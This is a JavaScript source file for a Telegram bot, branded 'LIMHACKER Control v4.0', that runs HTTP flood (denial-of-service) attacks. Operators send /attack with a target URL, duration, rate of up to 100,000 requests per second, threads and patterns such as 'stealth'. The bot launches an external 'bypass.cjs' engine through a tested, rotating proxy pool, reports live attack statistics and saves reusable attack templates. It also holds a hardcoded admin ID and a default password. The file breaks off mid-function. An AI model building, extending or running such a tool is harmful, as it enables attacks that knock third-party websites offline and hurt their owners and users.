import { Telegraf } from 'telegraf';
import { spawn, exec } from 'child_process';
import fs from 'fs';
import dotenv from 'dotenv';
import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import os from 'os';
import crypto from 'crypto';
import session from 'express-session';
import bodyParser from 'body-parser';
import http from 'http';
import https from 'https';
import net from 'net';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Load environment variables
dotenv.config();
console.log('\x1b[31m%s\x1b[0m', '⚡ Initializing LIMHACKER Control System...');

const token = process.env.TELEGRAM_BOT_TOKEN;
if (!token) {
    console.error('\x1b[31m%s\x1b[0m', '❌ ERROR: TELEGRAM_BOT_TOKEN missing');
    process.exit(1);
}

const bot = new Telegraf(token);
const ADMIN_ID = '6247762383';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'limhacker2026';
const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');

// ========== ADVANCED CONFIGURATION ==========
const CONFIG = {
    MAX_CONCURRENT_ATTACKS: 10,
    MAX_THREADS: 1000,
    MAX_RATE: 100000,
    MAX_DURATION: 7200,
    STATUS_UPDATE: 2000,
    METRICS_UPDATE: 5000,
    PROXY_CHECK: 60000,
    AUTO_SCALE: true,
    SCALE_THRESHOLD: 0.75,
    MAX_AUTO_THREADS: 500,
    ATTACK_PATTERNS: ['constant', 'square', 'saw', 'random', 'exponential', 'stealth'],
    MAX_PROXY_FAILS: 3,
    PROXY_TEST_TIMEOUT: 3000,
    AUTO_ROTATE_INTERVAL: 300000,
    MAX_MEMORY: 1024 * 1024 * 1024,
    MAX_CPU: 80,
    MAX_BANDWIDTH: 100 * 1024 * 1024,
    RETRY_ATTEMPTS: 3,
    RETRY_DELAY: 5000
};

// ========== DATA STORES ==========
const attacks = new Map();
const templates = new Map();
const schedules = new Map();
const userSessions = new Map();
const commandHistory = [];

const metrics = {
    startTime: Date.now(),
    totalAttacks: 0,
    totalRequests: 0,
    totalBytes: 0,
    totalSuccess: 0,
    totalFail: 0,
    peakRPS: 0,
    bandwidth: [],
    responseTime: []
};

// ========== PROXY MANAGER - FULLY FUNCTIONAL ==========
class ProxyManager {
    constructor() {
        this.proxies = new Map(); // Store proxy data
        this.stats = {
            total: 0,
            active: 0,
            dead: 0,
            avgLatency: 0,
            lastCheck: Date.now()
        };
        this.loadProxies();
        // Don't auto-test on startup - let user trigger tests
    }

    loadProxies() {
        if (!fs.existsSync('proxy.txt')) {
            console.log('\x1b[33m%s\x1b[0m', '⚠️ No proxy.txt file found');
            return;
        }
        
        try {
            const content = fs.readFileSync('proxy.txt', 'utf-8');
            const lines = content.split('\n')
                .map(l => l.trim())
                .filter(l => l && l.includes(':'));
            
            // Clear existing proxies
            this.proxies.clear();
            
            lines.forEach(proxy => {
                if (!this.proxies.has(proxy)) {
                    this.proxies.set(proxy, {
                        fails: 0,
                        latency: [],
                        lastUsed: 0,
                        successCount: 0,
                        failCount: 0,
                        protocol: proxy.startsWith('https') ? 'HTTPS' : 'HTTP',
                        status: 'untested',
                        lastTest: null
                    });
                }
            });
            
            this.updateStats();
            console.log('\x1b[31m%s\x1b[0m', `📡 Loaded ${this.proxies.size} proxies`);
        } catch (err) {
            console.error('Error loading proxies:', err);
        }
    }

    updateStats() {
        this.stats.total = this.proxies.size;
        this.stats.active = Array.from(this.proxies.values()).filter(d => d.fails < CONFIG.MAX_PROXY_FAILS && d.status === 'active').length;
        this.stats.dead = this.stats.total - this.stats.active;
        
        const latencies = Array.from(this.proxies.values())
            .flatMap(d => d.latency);
        this.stats.avgLatency = latencies.length > 0 
            ? Math.round(latencies.reduce((s, v) => s + v, 0) / latencies.length) 
            : 0;
        this.stats.lastCheck = Date.now();
    }

    getProxy() {
        if (this.proxies.size === 0) return null;
        
        // Get only working proxies
        const workingProxies = Array.from(this.proxies.entries())
            .filter(([_, data]) => data.fails < CONFIG.MAX_PROXY_FAILS && data.status === 'active');
        
        if (workingProxies.length === 0) return null;
        
        // Random selection from working proxies
        const selected = workingProxies[Math.floor(Math.random() * workingProxies.length)];
        selected[1].lastUsed = Date.now();
        return selected[0];
    }

    reportSuccess(proxy) {
        const data = this.proxies.get(proxy);
        if (data) {
            data.successCount++;
            data.fails = 0; // Reset fails on success
            data.status = 'active';
            this.updateStats();
        }
    }

    reportFailure(proxy) {
        const data = this.proxies.get(proxy);
        if (data) {
            data.fails++;
            data.failCount++;
            if (data.fails >= CONFIG.MAX_PROXY_FAILS) {
                data.status = 'dead';
                console.log('\x1b[31m%s\x1b[0m', `❌ Proxy marked as dead: ${proxy}`);
            }
            this.updateStats();
        }
    }

    reportLatency(proxy, ms) {
        const data = this.proxies.get(proxy);
        if (data) {
            data.latency.push(ms);
            if (data.latency.length > 5) data.latency.shift(); // Keep last 5
            this.updateStats();
        }
    }

    // Test a single proxy
    async testSingleProxy(proxy) {
        const [host, port] = proxy.split(':');
        const start = Date.now();
        
        return new Promise((resolve) => {
            const socket = new net.Socket();
            
            const timeout = setTimeout(() => {
                socket.destroy();
                resolve({ proxy, success: false, latency: 0, error: 'timeout' });
            }, CONFIG.PROXY_TEST_TIMEOUT);

            socket.setTimeout(CONFIG.PROXY_TEST_TIMEOUT);
            
            socket.on('connect', () => {
                clearTimeout(timeout);
                const latency = Date.now() - start;
                socket.destroy();
                
                // Try HTTP request through proxy
                const httpSocket = net.createConnection(parseInt(port), host, () => {
                    httpSocket.write(`GET http://httpbin.org/get HTTP/1.1\r\nHost: httpbin.org\r\n\r\n`);
                    
                    const httpTimeout = setTimeout(() => {
                        httpSocket.destroy();
                        resolve({ proxy, success: true, latency, error: null });
                    }, 2000);
                    
                    httpSocket.once('data', () => {
                        clearTimeout(httpTimeout);
                        httpSocket.destroy();
                        resolve({ proxy, success: true, latency, error: null });
                    });
                    
                    httpSocket.on('error', () => {
                        clearTimeout(httpTimeout);
                        resolve({ proxy, success: true, latency, error: null });
                    });
                });
                
                httpSocket.on('error', () => {
                    resolve({ proxy, success: true, latency, error: null });
                });
            });

            socket.on('error', () => {
                clearTimeout(timeout);
                resolve({ proxy, success: false, latency: 0, error: 'connection_failed' });
            });

            socket.on('timeout', () => {
                clearTimeout(timeout);
                socket.destroy();
                resolve({ proxy, success: false, latency: 0, error: 'timeout' });
            });

            socket.connect(parseInt(port), host);
        });
    }

    // Test all proxies (can be triggered by admin)
    async testAllProxies() {
        if (this.proxies.size === 0) {
            return { total: 0, active: 0, dead: 0 };
        }

        console.log('\x1b[33m%s\x1b[0m', '🔄 Testing all proxies...');
        
        const proxyList = Array.from(this.proxies.keys());
        const testPromises = proxyList.map(proxy => this.testSingleProxy(proxy));
        
        const results = await Promise.all(testPromises);
        
        let activeCount = 0;
        let deadCount = 0;
        
        results.forEach(result => {
            const data = this.proxies.get(result.proxy);
            if (result.success) {
                data.status = 'active';
                data.fails = 0;
                data.latency.push(result.latency);
                if (data.latency.length > 5) data.latency.shift();
                activeCount++;
            } else {
                data.status = 'dead';
                data.fails = CONFIG.MAX_PROXY_FAILS;
                deadCount++;
            }
            data.lastTest = Date.now();
        });

        this.updateStats();
        
        return {
            total: this.proxies.size,
            active: activeCount,
            dead: deadCount,
            timestamp: Date.now()
        };
    }

    getStats() {
        return this.stats;
    }

    getProxyList(limit = 20) {
        const proxies = Array.from(this.proxies.entries())
            .map(([proxy, data]) => ({
                proxy,
                status: data.status || 'untested',
                latency: data.latency.length > 0 ? Math.round(data.latency.reduce((s, v) => s + v, 0) / data.latency.length) : null,
                fails: data.fails,
                lastUsed: data.lastUsed ? new Date(data.lastUsed).toLocaleTimeString() : 'never',
                lastTest: data.lastTest ? new Date(data.lastTest).toLocaleTimeString() : 'never'
            }))
            .sort((a, b) => {
                if (a.status === 'active' && b.status !== 'active') return -1;
                if (a.status !== 'active' && b.status === 'active') return 1;
                return 0;
            })
            .slice(0, limit);
        
        return proxies;
    }
}

const proxyManager = new ProxyManager();

// ========== SIMPLE SYSTEM MONITOR ==========
class SystemMonitor {
    async getStats() {
        try {
            const cpus = os.cpus();
            const totalMem = os.totalmem();
            const freeMem = os.freemem();
            const usedMem = totalMem - freeMem;
            
            // Simple CPU load calculation
            const loadAvg = os.loadavg();
            const cpuCount = cpus.length;
            const cpuPercent = Math.min(100, Math.round((loadAvg[0] / cpuCount) * 100));
            
            return {
                cpu: cpuPercent || 0,
                memory: {
                    total: totalMem,
                    used: usedMem,
                    free: freeMem,
                    percentage: Math.round((usedMem / totalMem) * 100)
                },
                uptime: os.uptime(),
                hostname: os.hostname(),
                platform: os.platform(),
                arch: os.arch()
            };
        } catch (err) {
            console.error('Error getting system stats:', err);
            return null;
        }
    }
}

const systemMonitor = new SystemMonitor();

// ========== HELPER FUNCTIONS ==========
function countRunningAttacks() {
    let count = 0;
    for (const attack of attacks.values()) {
        if (attack.isRunning) count++;
    }
    return count;
}

function formatNumber(num) {
    if (num === undefined || num === null) return '0';
    return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function formatDuration(seconds) {
    const h = Math.floor(seconds / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = Math.floor(seconds % 60);
    return `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
}

function calculateSuccessRate(attack) {
    if (!attack.requestCount) return 0;
    return Math.round((attack.successCount / attack.requestCount) * 100);
}

function createProgressBar(percent, size = 20) {
    const filled = Math.floor(percent / 5);
    const bar = '█'.repeat(filled);
    const empty = '░'.repeat(size - filled);
    return bar + empty;
}

function loadAndCleanProxies() {
    if (!fs.existsSync('proxy.txt')) return [];
    try {
        const content = fs.readFileSync('proxy.txt', 'utf-8');
        return content.split('\n')
            .map(line => line.trim())
            .filter(line => line && line.includes(':'));
    } catch {
        return [];
    }
}

function validateUrl(url) {
    try {
        new URL(url);
        return true;
    } catch {
        return false;
    }
}

// ========== TELEGRAM BOT COMMANDS ==========
bot.start((ctx) => {
    const isAdmin = ctx.from.id.toString() === ADMIN_ID;
    ctx.replyWithMarkdown(`
┌──────────────────────────────────────────────────────────────┐
│                    LIMHACKER CONTROL v4.0                    │
├──────────────────────────────────────────────────────────────┤
│  Welcome, ${ctx.from.first_name}                              │
│  Status: ONLINE                                              │
│  Role: ${isAdmin ? 'ADMINISTRATOR' : 'OPERATOR'}             │
├──────────────────────────────────────────────────────────────┤
│  Commands:                                                    │
│  /attack <url> <time> <rate> <threads> [pattern]            │
│  /stop <id>                                                  │
│  /list                                                       │
│  /stats                                                      │
│  /save <name> <url> <time> <rate> <threads> [pattern]       │
│  /load <name>                                                │
│  /templates                                                  │
│  /setproxy (admin only)                                      │
│  /proxies (admin only)                                       │
│  /system                                                     │
│  /help                                                       │
└──────────────────────────────────────────────────────────────┘
    `);
});

bot.help((ctx) => {
    const isAdmin = ctx.from.id.toString() === ADMIN_ID;
    
    let adminSection = '';
    if (isAdmin) {
        adminSection = `
│  PROXY COMMANDS (ADMIN ONLY)                                   │
│  ──────────────────────────────────────────────────────────  │
│  /setproxy      - Upload proxy.txt file                      │
│  /proxies       - Show proxy statistics                      │
│  /proxy test    - Test all proxies                           │
│  /proxy list    - List all proxies with status               │
│  /proxy reload  - Reload proxy file                          │`;
    } else {
        adminSection = `
│  PROXY COMMANDS (RESTRICTED)                                   │
│  ──────────────────────────────────────────────────────────  │
│  🔒 Proxy management is restricted to administrators         │`;
    }
    
    ctx.replyWithMarkdown(`
┌──────────────────────────────────────────────────────────────┐
│                    COMMAND REFERENCE                          │
├──────────────────────────────────────────────────────────────┤
│  ATTACK COMMANDS                                              │
│  ──────────────────────────────────────────────────────────  │
│  /attack <url> <time> <rate> <threads> [pattern]            │
│    - url: target (http:// or https://)                       │
│    - time: duration in seconds (max: ${CONFIG.MAX_DURATION}) │
│    - rate: requests/second (max: ${CONFIG.MAX_RATE})         │
│    - threads: parallel threads (max: ${CONFIG.MAX_THREADS})  │
│    - pattern: constant, square, saw, random, exponential     │
│                                                              │
│  /stop <id>     - Stop specific attack                       │
│  /list          - List active attacks                        │
│  /stats         - System statistics                          │
│                                                              │
│  TEMPLATE COMMANDS                                            │
│  ──────────────────────────────────────────────────────────  │
│  /save <name> <url> <time> <rate> <threads> [pattern]       │
│  /load <name>   - Load and execute template                  │
│  /templates     - List all templates                         │
│                                                              │${adminSection}
│  SYSTEM COMMANDS                                              │
│  ──────────────────────────────────────────────────────────  │
│  /system        - System information                         │
│  /help          - Show this help                             │
└──────────────────────────────────────────────────────────────┘
    `);
});

bot.command('test', (ctx) => ctx.reply('✅ LIMHACKER system operational'));

// ========== ATTACK COMMAND ==========
bot.command('attack', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const [url, time, rate, threads, pattern = 'constant'] = args;

    if (!url || !time || !rate || !threads) {
        return ctx.reply('❌ Usage: /attack <url> <time> <rate> <threads> [pattern]');
    }

    if (!validateUrl(url)) {
        return ctx.reply('❌ Invalid URL format');
    }

    if (countRunningAttacks() >= CONFIG.MAX_CONCURRENT_ATTACKS) {
        return ctx.reply('⚠️ Maximum concurrent attacks reached');
    }

    if (!fs.existsSync('bypass.cjs')) {
        return ctx.reply('❌ Attack engine not found');
    }

    const proxies = loadAndCleanProxies();
    const attackId = crypto.randomBytes(4).toString('hex').toUpperCase();
    const duration = Math.min(parseInt(time), CONFIG.MAX_DURATION);
    const attackRate = Math.min(parseInt(rate), CONFIG.MAX_RATE);
    const attackThreads = Math.min(parseInt(threads), CONFIG.MAX_THREADS);
    const attackPattern = CONFIG.ATTACK_PATTERNS.includes(pattern) ? pattern : 'constant';
    const startTime = Date.now();

    const statusMsg = await ctx.replyWithMarkdown(`
┌──────────────────────────────────────────────────────────────┐
│                    ATTACK INITIALIZED                         │
├──────────────────────────────────────────────────────────────┤
│  ID: ${attackId}                                             │
│  Target: ${url.substring(0, 50)}                             │
├──────────────────────────────────────────────────────────────┤
│  Duration: ${duration}s                                      │
│  Rate: ${attackRate.toLocaleString()}/s                      │
│  Threads: ${attackThreads}                                   │
│  Pattern: ${attackPattern.toUpperCase()}                     │
│  Proxies: ${proxies.length}                                  │
└──────────────────────────────────────────────────────────────┘
    `);

    const attack = spawn('node', [
        'bypass.cjs',
        url,
        duration.toString(),
        attackRate.toString(),
        attackThreads.toString(),
        'proxy.txt',
        attackPattern
    ]);

    attacks.set(attackId, {
        process: attack,
        url,
        startTime,
        duration,
        rate: attackRate,
        threads: attackThreads,
        pattern: attackPattern,
        userId: ctx.from.id,
        username: ctx.from.username || ctx.from.first_name,
        chatId: ctx.chat.id,
        messageId: statusMsg.message_id,
        requestCount: 0,
        successCount: 0,
        failCount: 0,
        bytesTransferred: 0,
        statusCodes: {},
        responseTimes: [],
        isRunning: true,
        lastUpdate: Date.now()
    });

    attack.stdout.on('data', (data) => {
        const attackData = attacks.get(attackId);
        if (!attackData) return;
        
        const output = data.toString();
        
        if (output.includes('Status: [')) {
            const match = output.match(/Status: \[([^\]]+)\]/);
            if (match) {
                const parts = match[1].split(', ');
                let total = 0;
                let success = 0;
                let bytes = 0;
                
                parts.forEach(part => {
                    const [code, count] = part.split(': ');
                    if (count) {
                        const numCount = parseInt(count);
                        total += numCount;
                        if (code.startsWith('2')) success += numCount;
                        attackData.statusCodes[code] = (attackData.statusCodes[code] || 0) + numCount;
                        bytes += numCount * 1024;
                    }
                });
                
                attackData.requestCount = total;
                attackData.successCount = success;
                attackData.failCount = total - success;
                attackData.bytesTransferred += bytes;
                
                metrics.totalRequests += total - (attackData.lastTotal || 0);
                metrics.totalSuccess += success - (attackData.lastSuccess || 0);
                metrics.totalFail += (total - success) - (attackData.lastFail || 0);
                metrics.totalBytes += bytes;
                
                const now = Date.now();
                const timeDiff = (now - attackData.lastUpdate) / 1000;
                const reqDiff = total - (attackData.lastTotal || 0);
                const currentRPS = Math.floor(reqDiff / timeDiff);
                
                if (currentRPS > metrics.peakRPS) {
                    metrics.peakRPS = currentRPS;
                }
                
                const mbps = (bytes * 8) / (1024 * 1024 * timeDiff);
                metrics.bandwidth.push(mbps);
                if (metrics.bandwidth.length > 60) metrics.bandwidth.shift();
                
                attackData.lastTotal = total;
                attackData.lastSuccess = success;
                attackData.lastFail = total - success;
                attackData.lastUpdate = now;
            }
        }
    });

    attack.stderr.on('data', (data) => {
        console.error('\x1b[31m%s\x1b[0m', `[${attackId}] Error:`, data.toString());
    });

    attack.on('error', (err) => {
        console.error('\x1b[31m%s\x1b[0m', `[${attackId}] Process error:`, err.message);
        ctx.reply(`⚠️ Attack error: ${err.message}`);
        attacks.delete(attackId);
    });

    const updateInterval = setInterval(() => {
        const attackData = attacks.get(attackId);
        if (!attackData || !attackData.isRunning) {
            clearInterval(updateInterval);
            return;
        }

        const elapsed = Math.floor((Date.now() - attackData.startTime) / 1000);
        const percent = Math.min(100, Math.floor((elapsed / attackData.duration) * 100));
        const successRate = calculateSuccessRate(attackData);
        
        const now = Date.now();
        const timeDiff = (now - attackData.lastUpdate) / 1000;
        const reqDiff = attackData.requestCount - (attackData.lastTotal || 0);
        const currentRPS = Math.floor(reqDiff / Math.max(0.1, timeDiff));
        
        const topCodes = Object.entries(attackData.statusCodes)
            .sort((a, b) => b[1] - a[1])
            .slice(0, 3)
            .map(([code, count]) => `HTTP ${code}: ${count}`)
            .join(' | ');

        const progressBar = createProgressBar(percent);
        const bandwidth = (attackData.bytesTransferred * 8) / (1024 * 1024 * Math.max(1, elapsed));
        
        const updateMessage = 
`┌──────────────────────────────────────────────────────────────┐
│                    ATTACK IN PROGRESS                         │
├──────────────────────────────────────────────────────────────┤
│  ID: ${attackId}                                             │
│  Progress: ${progressBar} ${percent}%                        │
│  Elapsed: ${elapsed}s / ${attackData.duration}s              │
├──────────────────────────────────────────────────────────────┤
│  Requests: ${formatNumber(attackData.requestCount)}          │
│  Success: ${formatNumber(attackData.successCount)} (${successRate}%) │
│  Current RPS: ${currentRPS}                                  │
│  Bandwidth: ${bandwidth.toFixed(2)} Mbps                     │
│  Status: ${topCodes || 'Collecting...'}                      │
└──────────────────────────────────────────────────────────────┘`;

        ctx.telegram.editMessageText(attackData.chatId, attackData.messageId, null, updateMessage, { parse_mode: 'Markdown' })
            .catch(() => {});
    }, CONFIG.STATUS_UPDATE);

    attack.on('close', (code) => {
        clearInterval(updateInterval);
        
        const attackData = attacks.get(attackId);
        if (!attackData) return;
        
        attackData.isRunning = false;
        metrics.totalAttacks++;
        
        const elapsed = Math.floor((Date.now() - attackData.startTime) / 1000);
        const successRate = calculateSuccessRate(attackData);
        const avgRPS = Math.floor(attackData.requestCount / Math.max(1, elapsed));
        
        const codeBreakdown = Object.entries(attackData.statusCodes)
            .sort((a, b) => b[1] - a[1])
            .map(([code, count]) => `  HTTP ${code}: ${formatNumber(count)}`)
            .join('\n');

        const finalMessage = 
`┌──────────────────────────────────────────────────────────────┐
│                    ATTACK COMPLETE                            │
├──────────────────────────────────────────────────────────────┤
│  ID: ${attackId}                                             │
│  Target: ${attackData.url}                                   │
│  Duration: ${elapsed}s / ${attackData.duration}s             │
├──────────────────────────────────────────────────────────────┤
│  Total Requests: ${formatNumber(attackData.requestCount)}    │
│  Successful: ${formatNumber(attackData.successCount)} (${successRate}%) │
│  Failed: ${formatNumber(attackData.failCount)}               │
│  Average RPS: ${avgRPS}                                      │
│  Bandwidth: ${((attackData.bytesTransferred * 8) / (1024 * 1024 * Math.max(1, elapsed))).toFixed(2)} Mbps │
├──────────────────────────────────────────────────────────────┤
│  Status Code Analysis:                                        │
${codeBreakdown || '  No data collected'}
├──────────────────────────────────────────────────────────────┤
│  Operator: ${attackData.username}                            │
│  Pattern: ${attackData.pattern.toUpperCase()}                │
│  Exit Code: ${code}                                          │
└──────────────────────────────────────────────────────────────┘`;

        ctx.telegram.editMessageText(attackData.chatId, attackData.messageId, null, finalMessage, { parse_mode: 'Markdown' })
            .catch(() => {});
        
        attacks.delete(attackId);
    });
});

// ========== STOP COMMAND ==========
bot.command('stop', (ctx) => {
    const attackId = ctx.message.text.split(' ')[1];
    const attack = attacks.get(attackId);
    
    if (!attack) return ctx.reply('❌ Attack not found');
    
    if (attack.userId !== ctx.from.id && ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ Not authorized to stop this attack');
    }

    attack.process.kill('SIGINT');
    ctx.reply(`🛑 Attack ${attackId} terminated`);
});

// ========== LIST COMMAND ==========
bot.command('list', (ctx) => {
    if (attacks.size === 0) return ctx.reply('📊 No active attacks');

    let msg = '┌──────────────────────────────────────────────────────────────┐\n';
    msg += '│                    ACTIVE ATTACKS                               │\n';
    msg += '├──────────────────────────────────────────────────────────────┤\n';
    
    attacks.forEach((a, id) => {
        if (!a.isRunning) return;
        const elapsed = Math.floor((Date.now() - a.startTime) / 1000);
        const percent = Math.min(100, Math.floor((elapsed / a.duration) * 100));
        const progressBar = createProgressBar(percent, 10);
        
        msg += `│  ID: ${id} | ${a.username}\n`;
        msg += `│  ${a.url.substring(0, 40)}...\n`;
        msg += `│  ${progressBar} ${percent}% | ${elapsed}s/${a.duration}s\n`;
        msg += `│  Req: ${formatNumber(a.requestCount)} | Success: ${calculateSuccessRate(a)}%\n`;
        msg += '├──────────────────────────────────────────────────────────────┤\n';
    });
    
    msg += `└──────────────────────────────────────────────────────────────┘`;
    ctx.reply(msg, { parse_mode: 'Markdown' });
});

// ========== STATS COMMAND ==========
bot.command('stats', (ctx) => {
    const isAdmin = ctx.from.id.toString() === ADMIN_ID;
    const running = countRunningAttacks();
    const totalReqs = Array.from(attacks.values()).reduce((s, a) => s + (a.requestCount || 0), 0);
    const totalSuccess = Array.from(attacks.values()).reduce((s, a) => s + (a.successCount || 0), 0);
    
    let proxyInfo = '';
    if (isAdmin) {
        const proxyStats = proxyManager.getStats();
        proxyInfo = `
│  PROXY NETWORK (ADMIN)                                         │
│  ──────────────────────────────────────────────────────────  │
│  Total: ${proxyStats.total}                                   │
│  Active: ${proxyStats.active}                                 │
│  Avg Latency: ${proxyStats.avgLatency}ms                      │
│                                                              │`;
    }
    
    const uptime = process.uptime();
    
    const msg = 
`┌──────────────────────────────────────────────────────────────┐
│                    SYSTEM STATISTICS                          │
├──────────────────────────────────────────────────────────────┤
│  ATTACK METRICS                                               │
│  ──────────────────────────────────────────────────────────  │
│  Active: ${running}/${CONFIG.MAX_CONCURRENT_ATTACKS}          │
│  Total Attacks: ${metrics.totalAttacks}                       │
│  Templates: ${templates.size}                                 │
│                                                              │
│  TRAFFIC ANALYSIS                                             │
│  ──────────────────────────────────────────────────────────  │
│  Total Requests: ${formatNumber(totalReqs)}                   │
│  Success Rate: ${totalReqs > 0 ? Math.round((totalSuccess / totalReqs) * 100) : 0}% │
│  Peak RPS: ${metrics.peakRPS}                                 │
│  Bandwidth: ${formatBytes(metrics.totalBytes)}                │
│                                                              │${proxyInfo}
│  SYSTEM                                                       │
│  ──────────────────────────────────────────────────────────  │
│  Uptime: ${formatDuration(uptime)}                            │
│  Memory: ${formatBytes(process.memoryUsage().rss)}            │
│  CPU Cores: ${os.cpus().length}                               │
└──────────────────────────────────────────────────────────────┘`;

    ctx.reply(msg, { parse_mode: 'Markdown' });
});

// ========== PROXY COMMANDS - ADMIN ONLY ==========
bot.command('setproxy', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ ACCESS DENIED: Only administrators can upload proxy files');
    }
    ctx.reply('📤 Send proxy.txt file (format: ip:port per line)\n\nExample:\n192.168.1.1:8080\n203.45.67.89:3128\n\n⚠️ This action is restricted to administrators only.');
});

bot.command('proxies', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ ACCESS DENIED: Proxy information is restricted to administrators');
    }
    
    const stats = proxyManager.getStats();
    const msg = 
`┌──────────────────────────────────────────────────────────────┐
│                    PROXY NETWORK STATUS                       │
├──────────────────────────────────────────────────────────────┤
│  Total Proxies: ${stats.total}                                │
│  Active: ${stats.active}                                      │
│  Dead: ${stats.dead}                                          │
│  Average Latency: ${stats.avgLatency}ms                       │
│  Last Check: ${new Date(stats.lastCheck).toLocaleTimeString()} │
└──────────────────────────────────────────────────────────────┘

🔒 Admin Only Commands:
/proxy test - Test all proxies
/proxy list - List all proxies with status
/proxy reload - Reload proxy file`;
    ctx.reply(msg, { parse_mode: 'Markdown' });
});

bot.command('proxy', async (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ ACCESS DENIED: Proxy management is restricted to administrators');
    }
    
    const args = ctx.message.text.split(' ').slice(1);
    const subcmd = args[0];

    if (!subcmd) {
        return ctx.reply('❌ Usage: /proxy <test|list|reload>');
    }

    if (subcmd === 'test') {
        const msg = await ctx.reply('🔄 Testing all proxies... (This may take a moment)');
        
        try {
            const results = await proxyManager.testAllProxies();
            
            const resultMsg = 
`✅ Proxy Test Complete

Results:
• Total: ${results.total}
• Active: ${results.active}
• Dead: ${results.dead}
• Time: ${new Date(results.timestamp).toLocaleTimeString()}

Use /proxy list to see detailed status`;
            
            await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, resultMsg);
        } catch (error) {
            await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, `❌ Error testing proxies: ${error.message}`);
        }
        
    } else if (subcmd === 'list') {
        const proxies = proxyManager.getProxyList(15);
        
        if (proxies.length === 0) {
            return ctx.reply('📭 No proxies loaded. Use /setproxy to upload a proxy file.');
        }
        
        let listMsg = '📋 *Proxy List (Admin Only)*\n\n';
        proxies.forEach((p, index) => {
            const statusIcon = p.status === 'active' ? '✅' : p.status === 'dead' ? '❌' : '⏳';
            const latencyStr = p.latency ? `${p.latency}ms` : 'untested';
            listMsg += `${index + 1}. ${statusIcon} \`${p.proxy}\`\n`;
            listMsg += `   Status: ${p.status} | Latency: ${latencyStr} | Fails: ${p.fails}\n`;
            listMsg += `   Last Test: ${p.lastTest}\n\n`;
        });
        
        listMsg += `_Showing ${proxies.length} of ${proxyManager.getStats().total} proxies_`;
        
        ctx.reply(listMsg, { parse_mode: 'Markdown' });
        
    } else if (subcmd === 'reload') {
        proxyManager.loadProxies();
        ctx.reply(`🔄 Proxy file reloaded. Total proxies: ${proxyManager.getStats().total}`);
        
    } else {
        ctx.reply('❌ Unknown proxy command. Use: /proxy test, /proxy list, or /proxy reload');
    }
});

// ========== FILE HANDLER - ADMIN ONLY ==========
bot.on('document', async (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ ACCESS DENIED: File uploads are restricted to administrators');
    }

    if (ctx.message.document.file_name === 'proxy.txt') {
        const waitMsg = await ctx.reply('🔄 Processing proxy file... (Admin operation)');
        
        try {
            const file = await ctx.telegram.getFile(ctx.message.document.file_id);
            const fileUrl = `https://api.telegram.org/file/bot${token}/${file.file_path}`;
            const response = await fetch(fileUrl);
            const content = await response.text();
            
            // Validate and clean proxies
            const proxies = content.split('\n')
                .map(l => l.trim())
                .filter(l => l && l.includes(':') && !l.startsWith('#'));
            
            if (proxies.length === 0) {
                return ctx.reply('❌ No valid proxies found in file. Format should be ip:port per line.');
            }
            
            fs.writeFileSync('proxy.txt', proxies.join('\n'));
            proxyManager.loadProxies();
            
            await ctx.telegram.editMessageText(
                ctx.chat.id,
                waitMsg.message_id,
                null,
                `✅ Loaded ${proxies.length} proxies\n\nUse /proxy test to check which ones are working.`
            );
        } catch (error) {
            ctx.reply('❌ Failed: ' + error.message);
        }
    } else {
        ctx.reply('❌ Invalid file. Please upload proxy.txt');
    }
});

// ========== TEMPLATE COMMANDS ==========
bot.command('save', (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const [name, url, time, rate, threads, pattern = 'constant'] = args;
    
    if (!name || !url || !time || !rate || !threads) {
        return ctx.reply('❌ Usage: /save <name> <url> <time> <rate> <threads> [pattern]');
    }
    
    templates.set(name, { url, time, rate, threads, pattern });
    ctx.reply(`✅ Template saved: \`${name}\``);
});

bot.command('load', (ctx) => {
    const name = ctx.message.text.split(' ')[1];
    const template = templates.get(name);
    
    if (!template) return ctx.reply('❌ Template not found');
    
    const fakeMsg = {
        message: {
            text: `/attack ${template.url} ${template.time} ${template.rate} ${template.threads} ${template.pattern}`,
            chat: ctx.chat,
            from: ctx.from
        }
    };
    bot.command('attack')(fakeMsg);
});

bot.command('templates', (ctx) => {
    if (templates.size === 0) return ctx.reply('📭 No templates');
    
    let msg = '📋 *Templates*\n\n';
    templates.forEach((data, name) => {
        msg += `*${name}*\n`;
        msg += `  Target: ${data.url}\n`;
        msg += `  Duration: ${data.time}s | Rate: ${data.rate}/s | Threads: ${data.threads}\n`;
        msg += `  Pattern: ${data.pattern.toUpperCase()}\n\n`;
    });
    
    ctx.reply(msg, { parse_mode: 'Markdown' });
});

bot.command('delete', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) return ctx.reply('⛔ Unauthorized');
    
    const name = ctx.message.text.split(' ')[1];
    if (templates.delete(name)) {
        ctx.reply(`✅ Template deleted: ${name}`);
    } else {
        ctx.reply('❌ Template not found');
    }
});

// ========== STOP ALL ==========
bot.command('stopall', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) return ctx.reply('⛔ Unauthorized');
    
    const count = attacks.size;
    attacks.forEach((a) => {
        if (a.isRunning) a.process.kill('SIGINT');
    });
    attacks.clear();
    ctx.reply(`🛑 Stopped ${count} attacks`);
});

// ========== SYSTEM COMMAND ==========
bot.command('system', async (ctx) => {
    const stats = await systemMonitor.getStats();
